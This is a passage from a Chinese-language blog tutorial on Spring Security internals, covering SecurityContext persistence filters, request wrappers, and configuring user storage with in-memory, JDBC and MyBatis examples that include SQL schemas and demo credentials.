RequestWrapper类主要作用是禁止在异步Servlet提交时，自动保存SecurityContext。</p><p>为啥要禁止呢?还记得前面讲的子线程无法从TreadLocal中获取父线程的SecurityContext吗,所以当异步保存时会报错.</p><p>所以SaveToSessionRequestWrapper会将自动保存禁止掉所以这一功能在SecurityContextPersistenceFilter过滤器中完成SecurityContext保存操作。</p><h6 id="HttpSeesionSecurityContextRepository"><a href="#HttpSeesionSecurityContextRepository" class="headerlink" title="HttpSeesionSecurityContextRepository"></a>HttpSeesionSecurityContextRepository</h6><p>聊完该类里面定义的两个类来聊聊这个大类</p><p>首先时开头几个定义</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//定义了SecurityContext在HttpSession中存储的key</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">SPRING_SECURITY_CONTEXT_KEY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SPRING_SECURITY_CONTEXT&quot;</span>;<br><br>   <span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Log</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogFactory.getLog(<span class="hljs-built_in">this</span>.getClass());<br>   <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">contextObject</span> <span class="hljs-operator">=</span> SecurityContextHolder.createEmptyContext();<br><span class="hljs-comment">//allowSessionCreation用来设置是否允许创建HttpSession，默认是true。</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">allowSessionCreation</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>;<br><br><span class="hljs-comment">//disableUrlRewriting表示是否禁用URL重写，默认是false。</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">disableUrlRewriting</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">//springSecurityContextKey可以用来配置HttpSession中存储SecurityContext的key</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">springSecurityContextKey</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SPRING_SECURITY_CONTEXT&quot;</span>;<br><br><span class="hljs-comment">//用来获取是rememberMe认证还是匿名用户</span><br>   <span class="hljs-keyword">private</span> <span class="hljs-type">AuthenticationTrustResolver</span> <span class="hljs-variable">trustResolver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AuthenticationTrustResolverImpl</span>();<br><br><span class="hljs-comment">//获取SecurityContext,如果发现为空则创建一个并保存在HttpRequestResponseHolder对象中</span><br><span class="hljs-keyword">public</span> SecurityContext <span class="hljs-title function_">loadContext</span><span class="hljs-params">(HttpRequestResponseHolder requestResponseHolder)</span>&#123;...&#125;;<br><br><span class="hljs-comment">//用来保存SecurityContext,正常情况下在HttpServletResponse提交时就会被保存但是异步就由该方法保存</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">saveContext</span><span class="hljs-params">(SecurityContext context, HttpServletRequest request, HttpServletResponse response)</span> &#123;...&#125;;<br><span class="hljs-comment">//用来判断当前请求中是否存在SecurityContext</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">containsContext</span><span class="hljs-params">(HttpServletRequest request)</span>&#123;...&#125;;<br><br><span class="hljs-comment">//实现了如果从HttpSession中读取并存储为SecurityContext后返回,loadContext方法就调用了该方法</span><br>   <span class="hljs-keyword">private</span> SecurityContext <span class="hljs-title function_">readSecurityContextFromSession</span><span class="hljs-params">(HttpSession httpSession)</span>&#123;...&#125;;<br><br><span class="hljs-comment">//该方法用来生成一个不包含Authentication的空的SecurityContext对象,loadContext方法就调用了该方法</span><br><span class="hljs-keyword">protected</span> SecurityContext <span class="hljs-title function_">generateNewContext</span><span class="hljs-params">()</span> &#123;<br>       <span class="hljs-keyword">return</span> SecurityContextHolder.createEmptyContext();<br>   &#125;<br><br><span class="hljs-comment">//判断当前Authentication是否免于存储。</span><br><span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isTransientAuthentication</span><span class="hljs-params">(Authentication authentication)</span><br>       <br><span class="hljs-comment">//    setTrustResolver方法用来配置身份评估器。</span><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setTrustResolver</span><span class="hljs-params">(AuthenticationTrustResolver trustResolver)</span><br></code></pre></td></tr></table></figure><p>解决完HttpSeesionSecurityContextRepository就可以回到主体：</p><p>doFilter()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>       <span class="hljs-keyword">if</span> (request.getAttribute(<span class="hljs-string">&quot;__spring_security_scpf_applied&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>           chain.doFilter(request, response);<br>       &#125; <span class="hljs-keyword">else</span> &#123;<br>           request.setAttribute(<span class="hljs-string">&quot;__spring_security_scpf_applied&quot;</span>, Boolean.TRUE);<br>           <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.forceEagerSessionCreation) &#123;<br>               <span class="hljs-type">HttpSession</span> <span class="hljs-variable">session</span> <span class="hljs-operator">=</span> request.getSession();<br>               <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.logger.isDebugEnabled() &amp;&amp; session.isNew()) &#123;<br>                   <span class="hljs-built_in">this</span>.logger.debug(LogMessage.format(<span class="hljs-string">&quot;Created session %s eagerly&quot;</span>, session.getId()));<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-type">HttpRequestResponseHolder</span> <span class="hljs-variable">holder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HttpRequestResponseHolder</span>(request, response);<br>           <span class="hljs-type">SecurityContext</span> <span class="hljs-variable">contextBeforeChainExecution</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.repo.loadContext(holder);<br>           <span class="hljs-type">boolean</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br><br>           <span class="hljs-keyword">try</span> &#123;<br>               var10 = <span class="hljs-literal">true</span>;<br>               SecurityContextHolder.setContext(contextBeforeChainExecution);<br>               <span class="hljs-keyword">if</span> (contextBeforeChainExecution.getAuthentication() == <span class="hljs-literal">null</span>) &#123;<br>                   <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Set SecurityContextHolder to empty SecurityContext&quot;</span>);<br>               &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.logger.isDebugEnabled()) &#123;<br>                   <span class="hljs-built_in">this</span>.logger.debug(LogMessage.format(<span class="hljs-string">&quot;Set SecurityContextHolder to %s&quot;</span>, contextBeforeChainExecution));<br>               &#125;<br><br>               chain.doFilter(holder.getRequest(), holder.getResponse());<br>               var10 = <span class="hljs-literal">false</span>;<br>           &#125; <span class="hljs-keyword">finally</span> &#123;<br>               <span class="hljs-keyword">if</span> (var10) &#123;<br>                   <span class="hljs-type">SecurityContext</span> <span class="hljs-variable">contextAfterChainExecution</span> <span class="hljs-operator">=</span> SecurityContextHolder.getContext();<br>                   SecurityContextHolder.clearContext();<br>                   <span class="hljs-built_in">this</span>.repo.saveContext(contextAfterChainExecution, holder.getRequest(), holder.getResponse());<br>                   request.removeAttribute(<span class="hljs-string">&quot;__spring_security_scpf_applied&quot;</span>);<br>                   <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Cleared SecurityContextHolder to complete request&quot;</span>);<br>               &#125;<br>           &#125;<br><br>           <span class="hljs-type">SecurityContext</span> <span class="hljs-variable">contextAfterChainExecution</span> <span class="hljs-operator">=</span> SecurityContextHolder.getContext();<br>           SecurityContextHolder.clearContext();<br>           <span class="hljs-built_in">this</span>.repo.saveContext(contextAfterChainExecution, holder.getRequest(), holder.getResponse());<br>           request.removeAttribute(<span class="hljs-string">&quot;__spring_security_scpf_applied&quot;</span>);<br>           <span class="hljs-built_in">this</span>.logger.debug(<span class="hljs-string">&quot;Cleared SecurityContextHolder to complete request&quot;</span>);<br>       &#125;<br>   &#125;<br></code></pre></td></tr></table></figure><ol><li>首先从request中取出变量如果不是空就继续执行后面的,这里应该是防止异步</li><li>接下来对上面提到的那个变量设置为true之后判断forceEagerSessionCreation默认为false如果为true则要进行确会话有效操作,但是比较耗费资源</li><li>使用构造方法来构造出<a href="#SecurityContextHolder">HttpRequestResponseHolder</a>并将request和response存进去</li><li>然后加载一个SecurityContext并存入刚刚构造的HttpRequestResponseHolder实例里面</li><li>判断是否为匿名用户或无效用户</li><li>finally的作用是如果没有正常保存则进行保存</li><li>最后进行清空操作</li></ol><h4 id="第二种数据获取方式"><a href="#第二种数据获取方式" class="headerlink" title="第二种数据获取方式"></a>第二种数据获取方式</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/authentication&quot;)</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">authentication</span><span class="hljs-params">(Authentication authentication)</span> &#123;<br>     System.out.println(<span class="hljs-string">&quot;authentication = &quot;</span> + authentication);<br>  &#125;<br>  <span class="hljs-meta">@RequestMapping(&quot;/principal&quot;)</span><br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">principal</span><span class="hljs-params">(Principal principal)</span> &#123;<br>     System.out.println(<span class="hljs-string">&quot;principal = &quot;</span> + principal);<br>  &#125;<br></code></pre></td></tr></table></figure><p>经过验证上面两个的结果一样但是这些数据和springMVC一样都是由HttpServletRequest来提供的</p><p>一个普通的web项目不使用任何框架，请求是由tomcat提供RequestFacade来填充HttpServletRequest，由名字可以看出使用的是外观模式（Facade）这样防止使用者直接调用Tomcat的内部方法，但是如果使用了springSecurity则提供SecurityContextHolderAwareRequestWrapper来进行填充</p><blockquote><p>principal和authentication的数据都是由HttpServletRequest带来的,而在</p><p>不用框架则是RequestFacade实现</p><p>使用了springsecurity则是由Servlet3SecurityContextHolderAwareRequestWrapper来实现的并且实现类servlet3.0规范</p><p>他的上层实现了servlet3.0之前的规范</p><p>(讲道理我观察到的HttpServletRequest是SecurityContextHolderAwareRequestWrapper即该层实现了servlet3.0之前的规范)</p></blockquote><p>并且我们观察SecurityContextHolderAwareRequestWrapper类</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211008095855652.png" alt="image-20211008095855652"></p><ul><li><p>getAuthentication():获取Authentication对象,和SpringContextHolder中获取的一样</p></li><li><p>getRemoteUser():获取用户名</p></li><li><p>getUserPrincipal():该方法当前登录用户对象</p></li><li><p>isGranted():判断用户是否具有具体指定的某一用户</p></li><li><p>isUserInRole():判断用户是否具有某功能的用户</p></li></ul><p>&#x3D;&#x3D;所以可以看出第一种方法也可以直接使用HttpServletRequest获取&#x3D;&#x3D;</p><p>至于如何将请求转化为Servlet3SecurityContextHolderAware RequestWrapper呢,这就是SecurityContextHolderAwareRequestFilter的工作,详细代码如下(只留重点非全部代码)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SecurityContextHolderAwareRequestFilter</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">GenericFilterBean</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">rolePrefix</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ROLE_&quot;</span>;<br>    <span class="hljs-keyword">private</span> HttpServletRequestFactory requestFactory;<br><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest req, ServletResponse res, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        chain.doFilter(<span class="hljs-built_in">this</span>.requestFactory.create((HttpServletRequest)req, (HttpServletResponse)res), res);<br>    &#125;<br><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">updateFactory</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">rolePrefix</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.rolePrefix;<br>        <span class="hljs-built_in">this</span>.requestFactory = <span class="hljs-built_in">this</span>.createServlet3Factory(rolePrefix);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看出doFilter是直接创建了一个HttpServletRequset并且是通过createServlet3Factory()来创建该方法会创建一个,HttpServlet3RequestFactory而这个方法就是用来创建Servlet3SecurityContextHolderAwareRequestWrapper</p><h3 id="用户自定义数据获取"><a href="#用户自定义数据获取" class="headerlink" title="用户自定义数据获取"></a>用户自定义数据获取</h3><p>我们可以重写WebSecurityConfigurerAdapter类的configure(AuthenticationManagerBuilder)方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(AuthenticationManagerBuilder auth)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>       <span class="hljs-type">InMemoryUserDetailsManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InMemoryUserDetailsManager</span>();<br>       manager.createUser(User.withUsername(<span class="hljs-string">&quot;javaboy&quot;</span>)<br>                                 .password(<span class="hljs-string">&quot;&#123;noop&#125;123&quot;</span>).roles(<span class="hljs-string">&quot;admin&quot;</span>).build());<br>       manager.createUser(User.withUsername(<span class="hljs-string">&quot;sang&quot;</span>)<br>                                  .password(<span class="hljs-string">&quot;&#123;noop&#125;123&quot;</span>).roles(<span class="hljs-string">&quot;user&quot;</span>).build());<br>       auth.userDetailsService(manager);<br>&#125;<br></code></pre></td></tr></table></figure><p>{noop}代表不加密</p><p>而InMemoryUserDetailsManager内部是使用HashMap来实现的</p><h4 id="基于JdbcUserDetailsManager"><a href="#基于JdbcUserDetailsManager" class="headerlink" title="基于JdbcUserDetailsManager"></a>基于JdbcUserDetailsManager</h4><p>JdbcUserDetailsManager提供了数据库脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs mysql">create table `users`(<br>`username` varchar(500) primary key,<br>    `password` varchar(500) not null,<br>    `enabled` boolean not null<br>);<br>create table `authorities` (<br>`username` varchar(50) not null,<br>    `authority` varchar(50) not null,<br>    constraint fk_authorities_users foreign key(username) references users(username)<br>);<br>create unique index ix_auth_username on authorities (username,authority);<br></code></pre></td></tr></table></figure><p>准备依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-jdbc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>数据源配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">datasource:</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/security_authority?serverTimezone=UTC</span><br></code></pre></td></tr></table></figure><p>然后就可以在前一小节的config方法中进行数据的控制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">configure</span><span class="hljs-params">(AuthenticationManagerBuilder auth)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-type">JdbcUserDetailsManager</span> <span class="hljs-variable">manager</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JdbcUserDetailsManager</span>(dataSource);<br><br>    <span class="hljs-keyword">if</span>(!manager.userExists(<span class="hljs-string">&quot;YH&quot;</span>))&#123;<br>        manager.createUser(User.withUsername(<span class="hljs-string">&quot;YH&quot;</span>).password(<span class="hljs-string">&quot;&#123;noop&#125;123456&quot;</span>).roles(<span class="hljs-string">&quot;admin&quot;</span>).build());<br>    &#125;<br><br>    <span class="hljs-keyword">if</span>(!manager.userExists(<span class="hljs-string">&quot;ZZ&quot;</span>))&#123;<br>        manager.createUser(User.withUsername(<span class="hljs-string">&quot;ZZ&quot;</span>).password(<span class="hljs-string">&quot;&#123;noop&#125;123456&quot;</span>).roles(<span class="hljs-string">&quot;user&quot;</span>).build());<br>    &#125;<br><br>    auth.userDetailsService(manager);<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>创建数据库</li><li>导入依赖</li><li>配置连接参数</li><li>将数据写入获取对象的方法中</li></ul><p>这里使用的是JdbcUserDetailsManager类,因为该类继承了UserDetailsService,在系统中获取用户数据是调用该接口的loadUserByUsername方法</p><blockquote><p>JDBC默认调用的是users表和authorities表</p><p>JdbcUserDetailsManager则继承自JdbcDaoImpl，同时完善了数据库操作，又封装了用户的增删改查方法。</p></blockquote><h4 id="基于Mybatis"><a href="#基于Mybatis" class="headerlink" title="基于Mybatis"></a>基于Mybatis</h4><p>首先是三表关系</p><p><img src="/.com//Users\lll\AppData\Roaming\Typora\typora-user-images\image-20211008163428372.png" alt="image-20211008163428372"></p><p>首先建表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs mysql">CREATE TABLE `role` (<br>    `id` int(11) NOT NULL AUTO_INCREMENT,<br>    `name` varchar(32) DEFAULT NULL,<br>    `nameZh` varchar(32) DEFAULT NULL,<br>    PRIMARY KEY (`id`)<br>   ) ENGINE=InnoDB DEFAULT CHARSET=utf8;<br><br>   CREATE TABLE `user` (<br>    `id` int(11) NOT NULL AUTO_INCREMENT,<br>    `username` varchar(32) DEFAULT NULL,<br>    `password` varchar(255) DEFAULT NULL,<br>    `enabled` tinyint(1) DEFAULT NULL,<br>    `accountNonExpired` tinyint(1) DEFAULT NULL,<br>    `accountNonLocked` tinyint(1) DEFAULT NULL,<br>    `credentialsNonExpired` tinyint(1) DEFAULT NULL,<br>    PRIMARY KEY (`id`)<br>  ) ENGINE=InnoDB DEFAULT CHARSET=utf8;<br><br>   CREATE TABLE `user_role` (<br>    `id` int(11) NOT NULL AUTO_INCREMENT,<br>    `uid` int(11) DEFAULT NULL,<br>    `rid` int(11) DEFAULT NULL,<br>    PRIMARY KEY (`id`),<br>    KEY `uid` (`uid`),<br>    KEY `rid` (`rid`)<br>   ) ENGINE=InnoDB DEFAULT CHARSET=utf8;<br>   <br>   #插入数据<br>    INSERT INTO `role` (`id`, `name`, `nameZh`)<br>   VALUES<br>      (1,&#x27;ROLE_dba&#x27;,&#x27;数据库管理员&#x27;),<br>      (2,&#x27;ROLE_admin&#x27;,&#x27;系统管理员&#x27;),<br>      (3,&#x27;ROLE_user&#x27;,&#x27;用户&#x27;);<br><br>   INSERT INTO `user` (`id`, `username`, `password`, `enabled`,<br>          `accountNonExpired`, `accountNonLocked`, `credentialsNonExpired`)<br>   VALUES<br>      (1,&#x27;root&#x27;,&#x27;&#123;noop&#125;123&#x27;,1,1,1,1),<br>      (2,&#x27;admin&#x27;,&#x27;&#123;noop&#125;123&#x27;,1,1,1,1),<br>      (3,&#x27;sang&#x27;,&#x27;&#123;noop&#125;123&#x27;,1,1,1,1);<br><br>   INSERT INTO `user_role` (`id`, `uid`, `rid`)<br>   VALUES<br>      (1,1,1),<br>      (2,1,2),<br>      (3,2,2),<br>      (4,3,3);<br></code></pre></td></tr></table></figure><p>首先导入依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>   <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>   <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>数据库连接配置</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">spring:</span><br>  <span class="hljs-attr">datasource:</span><br>    <span class="hljs-attr">password:</span> <span class="hljs-number">123456</span><br>    <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://localhost:3306/security_authority?serverTimezone=UTC</span><br></code></pre></td></tr></table></figure><p>创建用户类和角色类(角色类需要继承UserDetails)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Data</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">UserDetails</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br>    <span class="hljs-keyword">private</span> String username;<br>    <span class="hljs-keyword">private</span> String password;<br>    <span class="hljs-comment">//是否可用</span><br>    <span class="hljs-keyword">private</span> Boolean enabled;<br>    <span class="hljs-comment">//是否过期</span><br>    <span 